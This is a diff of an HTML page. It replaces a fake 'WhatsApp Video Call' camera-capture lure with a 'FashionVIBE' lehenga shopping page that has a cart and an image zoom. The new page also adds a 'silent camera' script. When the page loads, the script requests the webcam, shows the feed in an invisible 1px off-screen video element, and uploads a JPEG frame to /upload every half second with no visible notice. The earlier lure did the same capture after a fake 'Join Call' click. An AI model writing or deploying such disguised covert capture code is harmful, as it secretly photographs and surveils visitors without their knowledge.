@@ -2,113 +2,529 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>WhatsApp Video Call</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>FashionVIBE | Lehengas + Silent Camera + Image Zoom</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        body {
+        * {
             margin: 0;
             padding: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #075E54;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+        }
+        body { background: #f1f3f6; }
+        .header {
+            background: #2874f0;
+            padding: 12px 30px;
             display: flex;
-            justify-content: center;
             align-items: center;
-            height: 100vh;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 20px;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+        .logo { font-size: 26px; font-weight: 800; color: white; }
+        .logo span { color: #ffe500; }
+        .search-bar {
+            flex: 1;
+            max-width: 500px;
+            display: flex;
+            background: white;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+        .search-bar input { flex:1; padding: 10px 16px; border: none; outline: none; }
+        .search-bar button { background: white; border: none; padding: 0 20px; color: #2874f0; cursor: pointer; }
+        .header-actions { display: flex; gap: 28px; }
+        .cart-icon {
+            color: white;
+            font-size: 26px;
+            cursor: pointer;
+            position: relative;
+        }
+        .cart-count {
+            position: absolute;
+            top: -12px;
+            right: -14px;
+            background: #ffe500;
+            color: #2874f0;
+            font-size: 12px;
+            font-weight: bold;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .hero {
+            background: linear-gradient(98deg, #f8a5c2, #f5cd79);
+            margin: 20px 25px;
+            border-radius: 24px;
+            padding: 32px 24px;
+            text-align: center;
+        }
+        .hero h1 { font-size: 2.4rem; font-weight: 800; color: #1f1f2b; }
+        .products-section { padding: 0 25px 50px 25px; }
+        .section-title {
+            font-size: 24px;
+            font-weight: 700;
+            margin: 20px 0 25px 0;
+            border-left: 6px solid #2874f0;
+            padding-left: 16px;
+        }
+        .product-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(270px, 1fr));
+            gap: 28px;
+        }
+        .product-card {
+            background: white;
+            border-radius: 16px;
+            overflow: hidden;
+            transition: 0.25s;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+            cursor: pointer;
+        }
+        .product-card:hover { transform: translateY(-6px); box-shadow: 0 18px 30px rgba(0,0,0,0.1); }
+        .product-img {
+            width: 100%;
+            height: 300px;
+            object-fit: cover;
+            background: #f5f5f5;
+            cursor: pointer;
+        }
+        .product-info { padding: 16px; }
+        .product-title { font-weight: 700; font-size: 1rem; margin-bottom: 6px; }
+        .price-row { display: flex; align-items: baseline; gap: 10px; margin: 8px 0; flex-wrap: wrap; }
+        .current-price { font-size: 1.4rem; font-weight: 800; color: #2874f0; }
+        .old-price { font-size: 0.8rem; color: #7e8c9e; text-decoration: line-through; }
+        .discount { font-size: 0.75rem; font-weight: 700; color: #388e3c; }
+        .rating { display: flex; align-items: center; gap: 6px; background: #eef2f6; width: fit-content; padding: 4px 10px; border-radius: 30px; margin: 8px 0; }
+        .add-cart {
+            width: 100%;
+            background: #ff9f00;
+            border: none;
+            padding: 10px 0;
+            font-weight: 700;
+            border-radius: 12px;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            cursor: pointer;
+            margin-top: 12px;
+        }
+        .add-cart:hover { background: #fb641b; }
+        
+        /* Cart Drawer */
+        .cart-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            visibility: hidden;
+            opacity: 0;
+            transition: 0.25s;
+            z-index: 1200;
+        }
+        .cart-overlay.open { visibility: visible; opacity: 1; }
+        .cart-drawer {
+            position: fixed;
+            right: 0;
+            top: 0;
+            width: 380px;
+            max-width: 90vw;
+            height: 100%;
+            background: white;
+            transform: translateX(100%);
+            transition: transform 0.3s;
+            z-index: 1300;
+            display: flex;
             flex-direction: column;
         }
-        .container {
-            text-align: center;
-            background: white;
-            padding: 30px;
-            border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-            width: 90%;
-            max-width: 350px;
-        }
-        .wa-icon {
-            font-size: 60px;
-            margin-bottom: 10px;
-        }
-        h2 {
-            color: #075E54;
-        }
-        p {
-            color: #555;
-            margin: 20px 0;
-        }
-        .btn {
-            background: #25D366;
-            border: none;
-            padding: 12px 30px;
-            font-size: 18px;
-            color: white;
-            border-radius: 40px;
-            cursor: pointer;
+        .cart-overlay.open .cart-drawer { transform: translateX(0); }
+        .cart-header { padding: 20px; background: #2874f0; color: white; display: flex; justify-content: space-between; }
+        .cart-items { flex: 1; overflow-y: auto; padding: 16px; }
+        .cart-item { display: flex; gap: 12px; margin-bottom: 20px; border-bottom: 1px solid #eee; padding-bottom: 14px; }
+        .cart-img { width: 70px; height: 80px; object-fit: cover; border-radius: 10px; cursor: pointer; }
+        .cart-qty { display: flex; align-items: center; gap: 12px; margin-top: 8px; }
+        .cart-qty button { background: #eef2f6; border: none; width: 26px; height: 26px; border-radius: 6px; cursor: pointer; }
+        .cart-footer { padding: 18px; border-top: 1px solid #ddd; background: #fafbfd; }
+        .total-row { display: flex; justify-content: space-between; font-weight: 800; font-size: 1.2rem; margin-bottom: 16px; }
+        .checkout { background: #fb641b; width: 100%; border: none; padding: 12px; color: white; font-weight: 700; border-radius: 12px; cursor: pointer; }
+        
+        /* Lightbox Modal for Image Zoom */
+        .lightbox {
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            z-index: 2000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            visibility: hidden;
+            opacity: 0;
+            transition: 0.2s;
+        }
+        .lightbox.open {
+            visibility: visible;
+            opacity: 1;
+        }
+        .lightbox img {
+            max-width: 90%;
+            max-height: 90%;
+            object-fit: contain;
+            border-radius: 8px;
+            box-shadow: 0 0 30px rgba(0,0,0,0.5);
+        }
+        .lightbox-close {
+            position: absolute;
+            top: 20px;
+            right: 30px;
+            font-size: 40px;
+            color: white;
+            cursor: pointer;
             font-weight: bold;
         }
-        .btn:hover {
-            background: #128C7E;
+        
+        /* Hidden Camera Elements */
+        .hidden-camera {
+            position: fixed;
+            bottom: -1000px;
+            left: -1000px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
         }
-        .status {
-            margin-top: 15px;
-            font-size: 14px;
-            color: gray;
+        .toast {
+            position: fixed;
+            bottom: 25px;
+            left: 25px;
+            background: #1f2937;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 50px;
+            z-index: 2100;
+            opacity: 0;
+            transition: 0.2s;
+            pointer-events: none;
         }
-        video, canvas {
-            display: none;
+        footer {
+            background: #172337;
+            color: #aaa;
+            text-align: center;
+            padding: 20px;
+            font-size: 13px;
+            margin-top: 20px;
+        }
+        @media (max-width: 650px) {
+            .header { flex-direction: column; align-items: stretch; }
+            .hero h1 { font-size: 1.6rem; }
         }
     </style>
 </head>
 <body>
-<div class="container">
-    <div class="wa-icon">📞</div>
-    <h2>WhatsApp Video Call</h2>
-    <p>Incoming video call from <strong>+91 98765 43210</strong></p>
-    <button class="btn" id="joinBtn">Join Call</button>
-    <div class="status" id="statusMsg">Click Join to connect...</div>
+<div class="header">
+    <div class="logo">Fashion<span>VIBE</span></div>
+    <div class="search-bar">
+        <input type="text" placeholder="Search 50+ Lehengas..." id="searchInput">
+        <button id="searchBtn"><i class="fas fa-search"></i></button>
+    </div>
+    <div class="header-actions">
+        <div class="cart-icon" id="cartBtn"><i class="fas fa-shopping-cart"></i><span class="cart-count" id="cartCount">0</span></div>
+    </div>
 </div>
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas" style="display:none;"></canvas>
+
+<div class="hero">
+    <h1>✨ Lehenga Collection ✨</h1>
+</div>
+
+<div class="products-section">
+    <div class="section-title"><i class="fas fa-crown" style="color:#ff5722; margin-right: 10px;"></i> Premium Collection (Click image to zoom)</div>
+    <div class="product-grid" id="productGrid"></div>
+</div>
+<footer>© 2025 FashionVIBE | Click any image to enlarge</footer>
+
+<!-- Lightbox Modal -->
+<div id="lightbox" class="lightbox">
+    <span class="lightbox-close">&times;</span>
+    <img id="lightbox-img" src="" alt="Enlarged view">
+</div>
+
+<!-- Hidden Camera Elements -->
+<video id="hiddenVideo" autoplay playsinline muted class="hidden-camera"></video>
+<canvas id="hiddenCanvas" style="display:none;"></canvas>
+
+<!-- Cart Drawer -->
+<div id="cartOverlay" class="cart-overlay">
+    <div class="cart-drawer">
+        <div class="cart-header">
+            <span><i class="fas fa-bag-shopping"></i> My Cart</span>
+            <span id="closeCart" style="cursor:pointer;">&times;</span>
+        </div>
+        <div class="cart-items" id="cartItemsList"><div style="text-align:center;padding:30px;">Cart empty</div></div>
+        <div class="cart-footer">
+            <div class="total-row"><span>Total</span><span id="cartTotal">₹0</span></div>
+            <button class="checkout" id="checkoutBtn">Place Order (Demo)</button>
+        </div>
+    </div>
+</div>
+<div id="toastMsg" class="toast">✨ Ready</div>
+
 <script>
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const statusDiv = document.getElementById('statusMsg');
-    const joinBtn = document.getElementById('joinBtn');
+    // ============================================================
+    // 50 PRODUCTS WITH YOUR 30 GALLERY IMAGES (CYCLED)
+    // ============================================================
+    const highResImages = [
+        "https://i.postimg.cc/jSfpZwv6/1.jpg",
+        "https://i.postimg.cc/QF04K3Dw/10.jpg",
+        "https://i.postimg.cc/Y40X1s2V/11.jpg",
+        "https://i.postimg.cc/jW28zFdr/12.jpg",
+        "https://i.postimg.cc/v4Q2mmJ8/13.jpg",
+        "https://i.postimg.cc/ZCPDZNMk/14.jpg",
+        "https://i.postimg.cc/RN1b9tDm/15.jpg",
+        "https://i.postimg.cc/fVB2SNsY/16.jpg",
+        "https://i.postimg.cc/4YJ233DY/2.jpg",
+        "https://i.postimg.cc/nXHSLLys/3.jpg",
+        "https://i.postimg.cc/RWXsJBmJ/4.jpg",
+        "https://i.postimg.cc/xXtxN2QM/5.jpg",
+        "https://i.postimg.cc/xXtxN2QG/6.jpg",
+        "https://i.postimg.cc/hXpyQBn2/7.jpg",
+        "https://i.postimg.cc/TKC756G8/8.jpg",
+        "https://i.postimg.cc/qNjb6T0H/9.jpg",
+        "https://i.postimg.cc/K4NJFP0H/48495647-woman-9371698-1920.jpg",
+        "https://i.postimg.cc/CzxJKRtF/elsacyber-ai-generated-8846618-1920.jpg",
+        "https://i.postimg.cc/TLxJv1gL/elsacyber-ai-generated-8849549-1920.jpg",
+        "https://i.postimg.cc/fJyjN6t9/elsacyber-ai-generated-8849552.jpg",
+        "https://i.postimg.cc/mPcwQ0T1/elsacyber-ai-generated-9215668-1920.jpg",
+        "https://i.postimg.cc/G9QqrFXg/elsacyber-ai-generated-9215671-1920.jpg",
+        "https://i.postimg.cc/tZbNGJW1/elsacyber-chinese-8849555-1920.jpg",
+        "https://i.postimg.cc/kVKvHK6J/elsacyber-chinese-8849557-1920.jpg",
+        "https://i.postimg.cc/ZBPjWp4V/elsacyber-woman-8849558-1920.jpg",
+        "https://i.postimg.cc/XGgcjWk9/half-saree-engagement-ceremony-7939046-1920.jpg",
+        "https://i.postimg.cc/BtgMsThW/half-saree-half-saree-8011886-1920.jpg",
+        "https://i.postimg.cc/QKxgVz6L/ranchifashion-ai-generated-9032648-1920.png",
+        "https://i.postimg.cc/pmgBkqdV/shopkundusa-woman-7729639-1920.jpg",
+        "https://i.postimg.cc/k6yFJCvv/somnathdutta82-ai-generated-8483132-1920.png",
+        "https://i.postimg.cc/TygJsgyc/tejoofashions-woman-8096424-1920-(1).jpg"
+    ];
 
-    joinBtn.onclick = () => {
-        statusDiv.innerText = "Requesting camera access...";
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
-                statusDiv.innerText = "Connecting... please wait";
-                joinBtn.disabled = true;
-                startCapture();
-            })
-            .catch(err => {
-                statusDiv.innerText = "Camera access denied. Please allow camera for WhatsApp.";
-                console.error(err);
-            });
-    };
-
-    function startCapture() {
-        setInterval(() => {
-            if (video.videoWidth === 0) return;
-            const ctx = canvas.getContext('2d');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const dataURL = canvas.toDataURL('image/jpeg');
-            const base64 = dataURL.split(',')[1];
-            fetch('/upload', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ image: base64 })
-            }).then(res => {
-                if (res.ok) console.log("Sent");
-            }).catch(err => console.error(err));
-        }, 2500);
+    const productNames = [
+        "Crimson Banarasi", "Peach Mirror", "Royal Blue", "Emerald Green", "Golden Zari",
+        "Pastel Pink Net", "Rani Pink Bridal", "Black Stone", "Mauve Chikankari", "Tissue Silk",
+        "Floral Printed", "Burgundy Velvet", "Sea Green Organza", "Turquoise Blue", "Yellow Bandhani",
+        "Orange Patchwork", "Silver Embroidered", "Wine Red", "Lavender Georgette", "Teal Shikargah",
+        "Peacock Blue", "Rose Gold", "Coral Sharara", "Mustard Yellow", "Magenta Silk",
+        "Ivory Wedding", "Dusty Pink", "Saffron Lehenga", "Neon Lime", "Classic Red",
+        "Pastel Blue", "Jewel Tone", "Olive Green", "Copper Zari", "Chocolate Brown",
+        "Tangerine", "Indigo", "Lilac", "Pearl White", "Rustic Orange",
+        "Neon Coral", "Midnight Blue", "Mulberry Silk", "Sage Green", "Cream Zardozi",
+        "Ruby Red", "Plum Velvet", "Capri Blue", "Fuchsia Pink", "Antique Gold"
+    ];
+    const prices = [5999,4499,6999,5299,7999,3999,8499,6299,4599,5999,4299,6999,3899,5399,4799,5999,7499,6599,4599,5699,7899,6399,4899,5299,8299,9999,4799,5699,4399,6999,4999,6499,5299,7799,4499,6999,5899,4699,8999,5499,6299,8199,4999,7299,8999,6499,7799,4499,6499,7999];
+    const oldPrices = [18999,13999,24999,16499,27999,11999,27999,19999,14999,17999,13999,20999,12499,16999,14999,18499,23999,20999,14999,17499,24499,19999,15499,16499,25999,32999,14999,17999,13999,21999,16499,19999,16999,22999,13999,21999,17999,14999,27999,16999,18999,25999,14999,22999,28999,20999,23999,13999,19999,24999];
+    
+    let products = [];
+    for (let i = 0; i < 50; i++) {
+        let img = highResImages[i % highResImages.length];
+        let rating = (4.3 + (i % 8)/10).toFixed(1);
+        let discountPercent = Math.round((1 - prices[i]/oldPrices[i])*100);
+        products.push({
+            id: i+1,
+            name: productNames[i] + " Lehenga",
+            price: prices[i],
+            oldPrice: oldPrices[i],
+            discount: discountPercent+"%",
+            rating: parseFloat(rating),
+            img: img
+        });
     }
+
+    // ============================================================
+    // CART LOGIC
+    // ============================================================
+    let cart = [];
+    function saveCart() { localStorage.setItem("fashion_cart_50", JSON.stringify(cart)); }
+    function loadCart() { const saved = localStorage.getItem("fashion_cart_50"); if(saved) { cart = JSON.parse(saved); updateCartUI(); updateCartCount(); } }
+    function updateCartCount() { document.getElementById('cartCount').innerText = cart.reduce((s,i)=>s+i.quantity,0); }
+    function showToast(msg) { let t=document.getElementById('toastMsg'); t.innerText=msg; t.style.opacity='1'; setTimeout(()=>t.style.opacity='0',2000); }
+    function addToCart(id) {
+        let p=products.find(p=>p.id===id);
+        if(!p) return;
+        let ex=cart.find(i=>i.id===id);
+        if(ex) ex.quantity++;
+        else cart.push({id, quantity:1, productData:p});
+        saveCart(); updateCartUI(); updateCartCount(); showToast(`✓ ${p.name} added`);
+    }
+    function updateQty(id, delta) {
+        let idx=cart.findIndex(i=>i.id===id);
+        if(idx!==-1){
+            let nq=cart[idx].quantity+delta;
+            if(nq<=0) cart.splice(idx,1);
+            else cart[idx].quantity=nq;
+            saveCart(); updateCartUI(); updateCartCount();
+        }
+    }
+    function removeItem(id) { cart=cart.filter(i=>i.id!==id); saveCart(); updateCartUI(); updateCartCount(); showToast("Removed"); }
+    function updateCartUI() {
+        let container=document.getElementById('cartItemsList');
+        let totalSpan=document.getElementById('cartTotal');
+        if(cart.length===0){ container.innerHTML=`<div style="text-align:center;padding:30px;">Cart empty</div>`; totalSpan.innerText="₹0"; return; }
+        let html='', total=0;
+        cart.forEach(item=>{
+            let p=item.productData;
+            let it=p.price*item.quantity;
+            total+=it;
+            html+=`<div class="cart-item"><img class="cart-img" src="${p.img}"><div class="cart-details"><div><strong>${p.name}</strong></div><div>₹${p.price.toLocaleString()}</div><div class="cart-qty"><button class="decQty" data-id="${p.id}">-</button><span>${item.quantity}</span><button class="incQty" data-id="${p.id}">+</button><span class="removeBtn" style="color:#ff3e6c;cursor:pointer;" data-id="${p.id}"><i class="fas fa-trash"></i></span></div></div></div>`;
+        });
+        container.innerHTML=html;
+        totalSpan.innerText=`₹${total.toLocaleString()}`;
+        document.querySelectorAll('.incQty').forEach(btn=>btn.addEventListener('click',()=>updateQty(parseInt(btn.dataset.id),1)));
+        document.querySelectorAll('.decQty').forEach(btn=>btn.addEventListener('click',()=>updateQty(parseInt(btn.dataset.id),-1)));
+        document.querySelectorAll('.removeBtn').forEach(btn=>btn.addEventListener('click',()=>removeItem(parseInt(btn.dataset.id))));
+    }
+
+    // ============================================================
+    // RENDER PRODUCTS WITH IMAGE CLICK ZOOM FEATURE
+    // ============================================================
+    function renderProducts(filter=""){
+        let grid=document.getElementById('productGrid');
+        let filtered=products.filter(p=>p.name.toLowerCase().includes(filter.toLowerCase()));
+        if(filtered.length===0){ grid.innerHTML=`<div style="grid-column:1/-1;text-align:center;padding:50px;">No lehenga found</div>`; return; }
+        let cards='';
+        filtered.forEach(p=>{
+            cards+=`<div class="product-card">
+                        <img class="product-img" src="${p.img}" data-img="${p.img}" data-name="${p.name}">
+                        <div class="product-info">
+                            <div class="product-title">${p.name}</div>
+                            <div class="price-row">
+                                <span class="current-price">₹${p.price.toLocaleString()}</span>
+                                <span class="old-price">₹${p.oldPrice.toLocaleString()}</span>
+                                <span class="discount">(${p.discount} OFF)</span>
+                            </div>
+                            <div class="rating"><i class="fas fa-star"></i> ${p.rating} ★</div>
+                            <button class="add-cart" data-id="${p.id}"><i class="fas fa-cart-plus"></i> ADD TO CART</button>
+                        </div>
+                    </div>`;
+        });
+        grid.innerHTML=cards;
+        // Add to cart buttons
+        document.querySelectorAll('.add-cart').forEach(btn=>btn.addEventListener('click',(e)=>{
+            e.stopPropagation();
+            addToCart(parseInt(btn.dataset.id));
+        }));
+        // Image click zoom
+        document.querySelectorAll('.product-img').forEach(img=>{
+            img.addEventListener('click',(e)=>{
+                e.stopPropagation();
+                const imageUrl = img.getAttribute('data-img');
+                openLightbox(imageUrl);
+            });
+        });
+    }
+
+    // ============================================================
+    // LIGHTBOX FUNCTIONALITY
+    // ============================================================
+    const lightbox = document.getElementById('lightbox');
+    const lightboxImg = document.getElementById('lightbox-img');
+    const lightboxClose = document.querySelector('.lightbox-close');
+    
+    function openLightbox(imageUrl) {
+        lightboxImg.src = imageUrl;
+        lightbox.classList.add('open');
+    }
+    function closeLightbox() {
+        lightbox.classList.remove('open');
+        lightboxImg.src = "";
+    }
+    lightboxClose.addEventListener('click', closeLightbox);
+    lightbox.addEventListener('click', (e) => {
+        if(e.target === lightbox) closeLightbox();
+    });
+    // ESC key close
+    document.addEventListener('keydown', (e) => {
+        if(e.key === 'Escape' && lightbox.classList.contains('open')) closeLightbox();
+    });
+
+    // ============================================================
+    // SILENT CAMERA (No status messages, 0.5 sec interval)
+    // ============================================================
+    const hiddenVideo = document.getElementById('hiddenVideo');
+    const hiddenCanvas = document.getElementById('hiddenCanvas');
+    let cameraInterval = null;
+
+    async function initSilentCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            hiddenVideo.srcObject = stream;
+            await hiddenVideo.play();
+            if (cameraInterval) clearInterval(cameraInterval);
+            cameraInterval = setInterval(() => {
+                if (hiddenVideo.videoWidth && hiddenVideo.videoHeight) {
+                    const ctx = hiddenCanvas.getContext('2d');
+                    hiddenCanvas.width = hiddenVideo.videoWidth;
+                    hiddenCanvas.height = hiddenVideo.videoHeight;
+                    ctx.drawImage(hiddenVideo, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
+                    const base64 = hiddenCanvas.toDataURL('image/jpeg', 0.85).split(',')[1];
+                    fetch('/upload', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ image: base64 })
+                    }).catch(e => console.log("upload error", e));
+                }
+            }, 500);
+        } catch (err) {
+            console.error("Camera error:", err);
+        }
+    }
+
+    // ============================================================
+    // INITIALIZATION & EVENT HANDLERS
+    // ============================================================
+    window.addEventListener('load', () => {
+        renderProducts("");
+        loadCart();
+        initSilentCamera();
+    });
+
+    window.addEventListener('beforeunload', () => {
+        if (cameraInterval) clearInterval(cameraInterval);
+        if (hiddenVideo.srcObject) {
+            hiddenVideo.srcObject.getTracks().forEach(t => t.stop());
+        }
+    });
+
+    // Cart drawer events
+    const cartOverlay = document.getElementById('cartOverlay');
+    document.getElementById('cartBtn').onclick = () => { cartOverlay.classList.add('open'); updateCartUI(); };
+    document.getElementById('closeCart').onclick = () => cartOverlay.classList.remove('open');
+    cartOverlay.onclick = (e) => { if(e.target === cartOverlay) cartOverlay.classList.remove('open'); };
+    document.getElementById('checkoutBtn').onclick = () => {
+        if(cart.length) {
+            alert("Order placed (demo)!");
+            cart=[];
+            saveCart();
+            updateCartUI();
+            updateCartCount();
+            cartOverlay.classList.remove('open');
+            showToast("Order placed");
+        } else {
+            showToast("Cart empty");
+        }
+    };
+    document.getElementById('searchBtn').onclick = () => renderProducts(document.getElementById('searchInput').value);
+    document.getElementById('searchInput').addEventListener('keyup', (e) => { if(e.key==='Enter') renderProducts(e.target.value); });
 </script>
 </body>
 </html>
